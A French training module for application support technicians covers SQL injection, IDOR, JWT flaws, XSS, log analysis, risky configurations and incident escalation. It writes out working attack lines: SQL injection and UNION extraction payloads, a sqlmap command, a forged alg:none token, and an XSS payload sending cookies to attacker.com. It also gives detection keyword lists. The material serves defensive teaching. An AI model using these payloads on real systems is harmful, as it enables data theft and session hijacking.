---
layout: page
title: "Sécurité applicative pour le support"

course: technicien_support_applicatif
chapter_title: "Sécurité applicative (niveau support)"

chapter: 8
section: 1

tags: sécurité applicative, owasp, authentification, injection, logs, support
difficulty: intermediate
duration: 110
mermaid: true

status: "published"
prev_module: "/courses/technicien_support_applicatif/22_performance.html"
prev_module_title: "Performance & optimisation : diagnostic et résolution"
next_module: "/courses/technicien_support_applicatif/24_pieges.html"
next_module_title: "Pièges avancés du support applicatif"
---

# Sécurité applicative pour le support

## Objectifs pédagogiques

À la fin de ce module, tu seras capable de :

1. **Identifier** les vecteurs d'attaque applicatifs les plus fréquemment exploités en production
2. **Reconnaître** dans les logs et les tickets les signaux d'une tentative d'exploitation active
3. **Analyser** une configuration applicative et détecter les erreurs classiques à risque élevé
4. **Escalader** un incident de sécurité avec les bons éléments techniques, au bon niveau
5. **Appliquer** les premiers réflexes défensifs dans un contexte de support, sans droits admin complets

---

## Mise en situation

Un lundi matin. L'équipe support reçoit un ticket : *"L'appli de facturation est lente depuis ce week-end."*

Le technicien ouvre le dashboard de monitoring. Rien d'anormal côté CPU. Il regarde les logs applicatifs — et là, entre des requêtes normales, une série de lignes comme celle-ci :

```
GET /api/invoices?customer_id=42 OR 1=1--  HTTP/1.1
GET /api/invoices?customer_id=42 UNION SELECT username,password,null FROM users--
```

Ce n'est pas un problème de performance. C'est une injection SQL active. L'attaquant a testé manuellement pendant le week-end — faible trafic, moins de bruit — puis lancé l'extraction automatisée dimanche soir.

**Pourquoi la défense naïve ne suffit pas ici ?** Le WAF était bien en place, mais configuré en mode *détection* seulement — personne n'avait voulu risquer des faux positifs en production. Le développeur avait utilisé une concaténation directe dans la requête SQL parce que *"c'est plus simple pour les filtres dynamiques"*. Et l'alerte monitoring ne s'est pas déclenchée parce que les requêtes d'injection retournaient du 200 avec les données — pas d'erreur 500 à comptabiliser.

Ce scénario n'est pas une hypothèse. Il correspond à la structure de dizaines d'incidents documentés, dont plusieurs contre des PME françaises en 2022-2023 utilisant des ERP accessibles via API REST.

**Ce que ce module t'apprend à faire :** repérer ça, comprendre pourquoi ça marche, et savoir quoi dire à qui.

---

## Surface d'attaque d'une application métier typique

Avant de parler d'attaque, il faut cartographier ce qui est exposé. En tant que technicien support, tu n'es pas le développeur — mais tu interagis quotidiennement avec presque toute cette surface.

| Vecteur | Ce qui est exposé | Impact potentiel |
|---|---|---|
| Endpoints REST / SOAP | Paramètres URL, body JSON/XML, headers | Injection, IDOR, contournement d'auth |
| Formulaires web | Champs de saisie utilisateur | XSS, injection, fuzzing |
| Fichiers uploadés | Format, taille, contenu non validé | Exécution de code, traversal de répertoire |
| Tokens et sessions | Cookies, JWT, clés API dans les headers | Vol de session, replay attack |
| Logs applicatifs | Données sensibles loguées en clair | Exfiltration de credentials, tokens |
| Dépendances tierces | Librairies npm/pip/maven outdatées | Exploitation de CVE connues (Log4Shell, etc.) |
| Configuration exposée | Fichiers `.env`, `appsettings.json` accessibles | Fuite de secrets, connexion directe à la BDD |
| Interface d'administration | Panel admin sans MFA, port exposé | Compromission totale |

🧠 La surface d'attaque n'est pas fixe. Elle augmente à chaque nouvelle fonctionnalité, chaque dépendance ajoutée, chaque port ouvert pour "déboguer en prod". Le rôle du support est souvent de la voir en premier — parce que c'est lui qui reçoit les logs et les tickets d'erreur.

---

## Mécanismes d'attaque — comment ça marche vraiment

### Injection SQL

L'attaquant manipule un paramètre d'entrée pour modifier la structure de la requête SQL exécutée par l'application. La condition est simple : l'application construit sa requête en concaténant directement l'entrée utilisateur.

**Code vulnérable :**
```python
query = "SELECT * FROM orders WHERE user_id = " + request.args.get("id")
```

**Payload basique :**
```
?id=1 OR 1=1--
```

La requête devient `SELECT * FROM orders WHERE user_id = 1 OR 1=1--` — elle retourne toutes les commandes de tous les utilisateurs.

**Payload d'extraction (UNION-based) :**
```
?id=0 UNION SELECT username, password, email FROM users--
```

L'outil standard pour automatiser ça : **sqlmap**.

```bash
sqlmap -u "https://app.example.com/api/orders?id=1" --dbs --batch
```

En quelques minutes, sqlmap identifie le type de BDD, énumère les tables et extrait les données. C'est exactement ce que représentaient les lignes de log du scénario initial.

🔴 **Vecteur :** paramètre `id` non échappé dans une requête SQL dynamique. Détectable dans les logs par la présence de mots-clés SQL dans les paramètres GET/POST :

```
# Signaux à chercher dans les access logs
' OR '1'='1
UNION SELECT
1; DROP TABLE
../../../etc/passwd    ← path traversal — même famille que l'injection
<script>alert(         ← XSS
```

---

### IDOR — Insecure Direct Object Reference

Probablement la vulnérabilité la plus simple à exploiter et l'une des plus fréquentes dans les applications métiers.

**Scénario :** un utilisateur authentifié accède à sa facture via :
```
GET /api/invoices/10542
```
Il modifie l'ID en `10543`, `10544`, etc. Si l'application ne vérifie pas que la facture appartient bien à cet utilisateur, il accède aux données d'autres clients. Aucun exploit sophistiqué : juste `curl` ou Burp Suite Intruder.

Ce type d'attaque est invisible dans les logs si on ne regarde pas les patterns d'accès. Un même utilisateur qui accède à 200 ressources différentes en 5 minutes avec des IDs séquentiels, c'est un signal clair — à condition de le chercher.

---

### Vol de session et JWT mal configurés

Les JWT sont utilisés dans la majorité des applications modernes pour l'authentification stateless. Le problème n'est pas le JWT lui-même — c'est sa configuration.

**Erreur n°1 — algorithme `none` accepté**

Le header d'un JWT contient l'algorithme de signature. Si le serveur accepte `alg: none`, n'importe qui peut forger un token valide sans clé secrète :

```
# Token légitime (header.payload.signature)
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWxpY2UifQ.xyz123

# Token forgé avec alg:none — signature vide, accepté par un serveur vulnérable
eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
```

**Erreur n°2 — secret JWT faible ou par défaut**

Des secrets comme `secret`, `password`, `changeme` ou le nom de l'application sont crackables en quelques secondes avec `hashcat` ou `jwt-cracker`.

**Erreur n°3 — pas de validation de l'expiration (`exp`)**

Un token expiré mais non rejeté équivaut à une session perpétuelle. Si le token est volé via XSS, logs ou interception, l'attaquant l'utilise indéfiniment.

🔴 **Vecteur :** JWT avec `alg:none`, secret faible, ou absence de vérification `exp`. Le payload d'un JWT est en base64url — pas chiffré. Tu peux le décoder directement sur [jwt.io](https://jwt.io) pour inspecter les claims.

---

### XSS — Cross-Site Scripting

Un attaquant injecte du JavaScript dans une page affichée à d'autres utilisateurs. L'impact le plus direct : vol de cookie de session.

**Payload classique :**
```html
<script>document.location='https://attacker.com/steal?c='+document.cookie</script>
```

Si l'application affiche du contenu utilisateur sans l'échapper — un champ commentaire, un nom de dossier, une note interne — ce script s'exécute dans le navigateur de toute personne qui consulte la page.

🔴 **Vecteur :** champs de saisie libre rendus sans encodage HTML. Particulièrement dangereux dans les applications métiers internes, où la confiance entre utilisateurs est implicite et où personne ne s'attend à une attaque "de l'intérieur".

---

## Reconnaître un incident dans les logs

C'est la compétence centrale d'un technicien support face à un événement de sécurité. Les attaques laissent des traces — encore faut-il savoir où regarder et quoi chercher.

```mermaid
flowchart TD
    A[Ticket entrant ou alerte monitoring] --> B{Type de symptôme}
    B -->|Erreurs 500 répétées sur un endpoint| C[Regarder les paramètres des requêtes]
    B -->|Comportement utilisateur anormal| D[Regarder les logs d'accès - IPs, fréquence, patterns]
    B -->|Données incohérentes ou manquantes| E[Regarder les logs BDD + audit trail]
    B -->|Compte bloqué ou session expirée| F[Regarder les logs d'authentification]
    C --> G{Mots-clés suspects dans les params ?}
    G -->|Oui : SQL, script, ../| H[🔴 Tentative d'injection - Escalader N2/Sécu]
    G -->|Non| I[Chercher erreur applicative classique]
    D --> J{Accès séquentiel à des ressources ?}
    J -->|Oui - même IP, IDs incrémentaux| K[🔴 IDOR probable - Vérifier périmètre accès]
    J -->|Non| L[Analyser pattern temporel]
    F --> M{Tentatives multiples échouées ?}
    M -->|Oui - brute force| N[🔴 Brute force - Vérifier lockout policy]
    M -->|Non| O[Analyser token / session expiry]
```

### Ce que tu loggues sans le savoir

⚠️ Dans de nombreuses applications, le niveau de log `DEBUG` ou `TRACE` activé en production écrit les headers HTTP complets dans les fichiers de log — ce qui inclut le header `Authorization: Bearer <token>`.

```
# Exemple de log applicatif en mode DEBUG — ce qu'on trouve sur le disque
[DEBUG] Incoming request headers:
  Host: app.internal.company.com
  Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
  Cookie: session_id=abc123xyz
  X-Forwarded-For: 10.0.2.15
```

Ces logs sont souvent accessibles à toute l'équipe support, sauvegardés sur des partages réseau mal protégés, et inclus dans des archives de débogage envoyées par mail. **Correction :** désactiver le niveau DEBUG en prod, ou configurer un filtre de logging qui masque les headers sensibles avant écriture sur disque.

---

## Analyser une configuration applicative

Le support est souvent en contact avec des fichiers de configuration — pour redémarrer un service, modifier un paramètre, diagnostiquer une connexion. Ces fichiers contiennent fréquemment des erreurs de sécurité directement exploitables.

**1. Credentials en dur dans la config**

```yaml
# appsettings.json — ce qu'on trouve régulièrement
{
  "Database": {
    "ConnectionString": "Server=db.internal;Database=prod;User=sa;Password=Admin2023!"
  },
  "ExternalApi": {
    "Key": "sk-prod-xxxxxxxxxxxxxxxxxxxxxxxxxxx"
  }
}
```

Ce fichier est souvent versionné dans Git, copié sur des serveurs de preprod, envoyé par mail pour "dépanner". Une clé comme `sk-prod-xxx` donne accès direct à l'API externe — parfois avec des droits de facturation. Les secrets ne doivent jamais être dans un fichier de config versionné. En prod, ils doivent venir de variables d'environnement ou d'un vault (HashiCorp Vault, Azure Key Vault, AWS Secrets Manager). Si tu vois un credential en clair dans un fichier, c'est un finding à remonter — pas à copier-coller.

**2. CORS trop permissif**

```
# Header de réponse HTTP — configuration dangereuse
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

Ces deux headers ensemble permettent à n'importe quel site web malveillant de faire des requêtes authentifiées vers l'application au nom d'un utilisateur connecté. C'est la base d'une attaque CSRF/CORS combinée.

**3. Headers de sécurité absents**

```bash
# Ce qu'on espère voir dans la réponse HTTP
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Content-Security-Policy: default-src 'self'

# Ce qu'on voit trop souvent : aucun de ces headers
```

L'absence de `X-Frame-Options` permet le clickjacking. L'absence de `Content-Security-Policy` facilite le XSS. Ce sont des configurations d'une ligne — mais leur absence crée des vecteurs d'attaque réels. Pour auditer rapidement : [securityheaders.com](https://securityheaders.com) donne un score de A+ à F et liste les headers manquants en 10 secondes.

---

## Tests rapides à faire en contexte support

Tu n'es pas pentesteur — mais tu peux faire des vérifications de premier niveau qui ont de la valeur opérationnelle.

**Auditer les headers HTTP d'une application :**
```bash
curl -sI https://<APP_URL> | grep -iE "(strict-transport|x-frame|x-content|content-security|set-cookie)"
```

**Vérifier si un endpoint retourne des données sans authentification :**
```bash
# Doit retourner 401 ou 403 — pas des données
curl -s https://<APP_URL>/api/users | head -50
```

**Vérifier l'expiration d'un certificat TLS :**
```bash
echo | openssl s_client -connect <HOST>:<PORT> 2>/dev/null | openssl x509 -noout -dates
```

**Tester si un token JWT expiré est encore accepté :**
```bash
curl -s -o /dev/null -w "%{http_code}" \
  -H "Authorization: Bearer <EXPIRED_TOKEN>" \
  https://<APP_URL>/api/protected
# 401 = correct / 200 = vulnérable
```

**Scanner les dépendances pour des CVE connues :**
```bash
# Node.js — depuis le répertoire de l'application
npm audit

# Python
pip-audit

# Java (avec Trivy installé)
trivy fs --security-checks vuln /path/to/app
```

💡 `npm audit` et `pip-audit` ne nécessitent pas de droits élevés. Le résultat donne directement les CVE, leur sévérité (Critical/High/Medium) et le chemin de mise à jour. C'est souvent suffisant pour ouvrir un ticket de patch management avec les bonnes informations.

---

## Escalade d'un incident de sécurité

La décision la plus importante que tu auras à prendre : est-ce que ce ticket est un bug, ou est-ce que c'est un incident de sécurité ?

```mermaid
flowchart LR
    A[Anomalie détectée] --> B{Exploitable activement ?}
    B -->|Oui - attaque en cours| C[🔴 P1 - Alerter N2 Sécu immédiatement\nConserver les logs\nNe pas redémarrer le service]
    B -->|Peut-être - trace suspecte| D[Documenter : IP, timestamp,\npayload, endpoint concerné]
    D --> E{Données sensibles exposées ?}
    E -->|Oui| F[🔴 Incident données - DPO à notifier\nRGPD : 72h pour déclarer à la CNIL]
    E -->|Non| G[Ticket sécurité P2 vers équipe dev\nAvec reproducer et logs]
    B -->|Non - vulnérabilité identifiée| H[Ticket finding sécurité\nSévérité CVSS si connue\nSans exploit actif]
```

Quand tu identifies un incident de sécurité potentiel, **ne redémarre pas le service**, **ne supprime pas les logs**, **ne tente pas de corriger toi-même**. Capture :

- L'heure exacte des premiers événements suspects (UTC si possible)
- Les IPs sources impliquées
- Les endpoints ciblés et les payloads visibles dans les logs
- L'état actuel de l'application (répond-elle normalement ?)
- Le périmètre de données potentiellement touché (quelle table, quelle fonctionnalité)

Ces éléments sont nécessaires à l'équipe sécurité pour confirmer l'incident, évaluer l'impact et déclencher la chaîne de notification réglementaire si besoin.

---

## Cas réel en entreprise

**Contexte :** éditeur SaaS B2B, environ 80 clients PME, application de gestion RH. Incident survenu en 2022.

Un technicien support reçoit un ticket d'un client : *"Des données d'un autre de vos clients apparaissent dans notre export."* Le technicien pense à un bug de filtre — il escalade vers le dev. Le développeur ouvre le code et comprend immédiatement : le filtre multi-tenant utilisait l'ID de compagnie passé dans le paramètre `company_id` de la requête **sans le valider côté serveur**. Tout utilisateur authentifié pouvait changer cet ID et accéder aux données d'un autre locataire.

**Impact :** exposition des données RH — noms, salaires, contrats — de plusieurs dizaines de clients pendant une durée indéterminée, potentiellement depuis la mise en production de la fonctionnalité 8 mois plus tôt.

**Ce qui a manqué côté support :**
- Les logs d'accès n'étaient pas analysés régulièrement → la détection a eu lieu par un client, pas en interne
- Aucun ticket précédent ne mentionnait d'anomalie sur les exports → peut-être des exploitations silencieuses antérieures

**Leçons tirées :** l'IDOR est indétectable si on ne surveille pas les patterns d'accès (même user, IDs variés, volume inhabituel). La confiance dans les paramètres envoyés par le client est une erreur de design systémique. Et le support a un rôle de détection précoce — à condition d'avoir un playbook et de savoir quoi chercher.

---

## Erreurs de configuration à fort impact

Ces trois erreurs sont récurrentes en production. Elles ne nécessitent pas de compétence d'attaquant pour être exploitées.

---

⚠️ **`DEBUG=True` en production**

En Django, Flask ou Spring Boot, le mode debug expose une page d'erreur interactive qui peut, sur certaines versions, permettre d'**exécuter du code directement dans le navigateur** via le Werkzeug debugger. Django Debug Toolbar expose aussi le schéma de BDD complet et toutes les requêtes SQL exécutées.

Signal détectable : stack trace complète visible dans le navigateur lors d'une erreur. Correction : variable d'environnement `DEBUG=False` en prod, sans lecture depuis un fichier versionné.

---

⚠️ **Mot de passe par défaut sur l'interface d'administration**

Tomcat Manager (`tomcat`/`tomcat`), Jenkins sans auth sur les anciennes versions, phpMyAdmin avec `root` sans mot de passe — ces interfaces sont scannées en continu par des bots. Shodan indexe des milliers d'instances exposées avec leurs versions.

Conséquence : accès admin complet, déploiement de webshell, pivot vers le réseau interne. Correction : changer tous les credentials par défaut avant mise en production, mettre les interfaces d'admin derrière un VPN.

---

⚠️ **Upload de fichiers sans validation du type réel**

Valider uniquement l'extension du fichier (`if file.endswith('.pdf')`) ne suffit pas — un attaquant renomme `shell.php` en `shell.pdf`. La validation doit vérifier les **magic bytes** (les premiers octets du fichier) et le content-type réel.

Conséquence : upload d'un webshell PHP, exécution de commandes sur le serveur web. Correction : validation par magic bytes, stockage des uploads hors de la racine web, désactivation de l'exécution de scripts dans le répertoire d'upload.

---

## Bonnes pratiques pour le support applicatif

Ces pratiques ne nécessitent pas de droits admin. Elles s'intègrent dans le travail quotidien.

1. **Analyser les logs d'accès régulièrement, pas seulement quand il y a un ticket.** Les attaques IDOR et les scans automatisés passent inaperçus si personne ne regarde les patterns d'accès au quotidien.

2. **Signaler tout credential visible en clair dans un fichier de config ou un log.** Ce n'est pas de la délation — c'est de la prévention. Un secret exposé aujourd'hui peut devenir un incident dans six mois.

3. **Ne jamais redémarrer un service ni effacer des logs pendant une investigation de sécurité.** Les logs sont les preuves. Leur perte peut compromettre la réponse à incident et compliquer les obligations réglementaires (RGPD).

4. **Systématiser la vérification des headers de sécurité lors des audits de configuration.** Un `curl -sI` et une comparaison avec la liste attendue prennent deux minutes et peuvent identifier des vecteurs XSS ou clickjacking ouverts depuis le déploiement initial.

5. **Lancer `npm audit` ou `pip-audit` sur les applications que tu maintiens.** Ces outils sont non-destructifs, ne nécessitent pas de droits élevés, et donnent une image instantanée des CVE actives sur les dépendances installées.

6. **Distinguer un bug d'un incident de sécurité avant d'escalader.** Un comportement inattendu + des paramètres suspects dans les logs + un endpoint sensible = incident de sécurité. Escalader vers l'équipe sécu, pas vers le dev fonctionnel.

7. **Documenter précisément avant d'escalader.** IP source, timestamp UTC, endpoint, payload visible, code HTTP retourné, périmètre de données concerné. Un ticket de sécurité bien renseigné peut diviser par deux le temps de réponse de l'équipe qui prend en charge.

---

## Résumé

Les attaques applicatives les plus fréquentes en production — injection SQL, IDOR, XSS, JWT mal configurés — exploitent des erreurs de développement prévisibles, pas des zero-days sophistiqués. Un technicien support qui connaît ces mécanismes peut les détecter dans les logs avant qu'ils ne deviennent des incidents majeurs.

La détection passe par les patterns anormaux dans les logs (mots-clés SQL dans les paramètres, accès séquentiels à des ressources, tokens expirés encore acceptés), par l'audit de configuration (headers de sécurité, mode debug, credentials en clair), et par une escalade structurée avec les bons éléments capturés avant toute intervention. La contrainte principale reste qu'en support, tu n'as pas les droits pour corriger — mais tu as souvent l'accès aux logs et l'œil sur le trafic applicatif. C'est déjà un levier de détection considérable, à condition de savoir quoi chercher.

---

<!-- snippet
id: appsec_sqli_detect_logs
type: tip
tech: logs
level: intermediate
importance: high
format: knowledge
tags: injection,sql,logs,detection,support
title: Détecter une tentative d'injection SQL dans les access logs
content: Chercher dans les access logs les mots-clés suivants dans les paramètres URL ou body : `UNION`, `SELECT`, `OR 1=1`, `--`, `'`. Ces patterns indiquent un test d'injection manuel ou automatisé (sqlmap). La présence simultanée de codes HTTP 500 répétés et de ces mots-clés sur un même endpoint est le signal d'une tentative active — escalader immédiatement vers N2 sécurité.
description: Les injections SQL laissent des traces claires dans les logs — mots-clés SQL dans les paramètres GET/POST, souvent accompagnés d'erreurs 500 répétées sur un même endpoint.
-->

<!-- snippet
id: appsec_jwt_algnone_concept
type: concept
tech: jwt
level: intermediate
importance: high
format: knowledge
tags: jwt,authentification,token,falsification,owasp
title: JWT avec alg=none — forger un token sans clé secrète
content: Un JWT est composé de header.payload.signature encodés en base64url. Si le serveur accepte l'algorithme `none`, la signature n'est pas vérifiée. L'attaquant modifie le header pour mettre `"alg":"none"`, change le payload (ex: `"role":"admin"`), supprime la signature — et le serveur accepte le token comme valide. Détectable en décodant le header base64url d'un token intercepté (outil : jwt.io).
description: Si le serveur accepte alg=none dans un JWT, n'importe qui peut forger un token admin sans connaître la clé secrète — la vérification de signature est ignorée.
-->

<!-- snippet
id: appsec_headers_check_curl
type: command
tech: curl
level: intermediate
importance: high
format: knowledge
tags: headers,securite,audit,curl,http
title: Auditer les headers de sécurité HTTP d'une application
command: curl -sI https://<APP_URL> | grep -iE "(strict-transport|x-frame|x-content|content-security|set-cookie)"
example: curl -sI https://app.example.com | grep -iE "(strict-transport|x-frame|x-content|content-security|set-cookie)"
description: Vérifie la présence des headers de sécurité critiques (HSTS, X-Frame-Options, CSP). Absence de résultat = headers manquants = finding à documenter et escalader vers l'équipe dev.
-->

<!-- snippet
id: appsec_jwt_expired_test
type: command
tech: curl
level: intermediate
importance: high
format: knowledge
tags: jwt,session,authentification,test,curl
title: Tester si un token JWT expiré est encore accepté par l'API
command: curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer <EXPIRED_TOKEN>" https://<APP_URL>/api/protected
example: curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2MDAwMDAwMDB9.xxx" https://app.example.com/api/me
description: Doit retourner 401. Si le code retourné est 200, l'application n'invalide pas les tokens expirés — session potentiellement perpétuelle après vol de token.
-->

<!-- snippet
id: appsec_idor_pattern_warning
type: warning
tech: logs
level: intermediate
importance: high
format: knowledge
tags: idor,access-control,logs,detection,owasp
title: IDOR — pattern d'accès séquentiel à surveiller dans les logs
content: Signal d'alerte : un même utilisateur authentifié accède à des ressources avec des IDs séquentiels (ex: /api/invoices/1001, /1002, /1003...) en rafale sur une courte période. L'IDOR ne génère pas d'erreur HTTP — les requêtes retournent 200. La détection passe uniquement par l'analyse des patterns d'accès : volume par user_id, séquentialité des IDs, fenêtre temporelle. Alerter dès qu'un utilisateur accède à plus de N ressources distinctes en moins de T secondes.
description: L'IDOR ne génère pas d'erreur HTTP — les requêtes retournent 200. Seule l'analyse des patterns d'accès (volume, séquentialité des IDs) permet la détection.
-->

<!-- snippet
id: appsec_debug_prod_warning
type: warning
tech: configuration
level: beginner
importance: high
format: knowledge
tags: debug,configuration,django,flask,production
title: Mode DEBUG activé en production — exécution de code possible
content: Configuration critique : `DEBUG=True` dans Django ou Flask en production. Sur certaines versions, la page d'erreur interactive (Werkzeug debugger) permet d'exécuter du code Python directement dans le navigateur sans authentification. Django Debug Toolbar expose aussi le schéma de BDD complet et toutes les requêtes SQL exécutées. Signal détectable : stack trace complète visible dans le navigateur lors d'une erreur applicative.
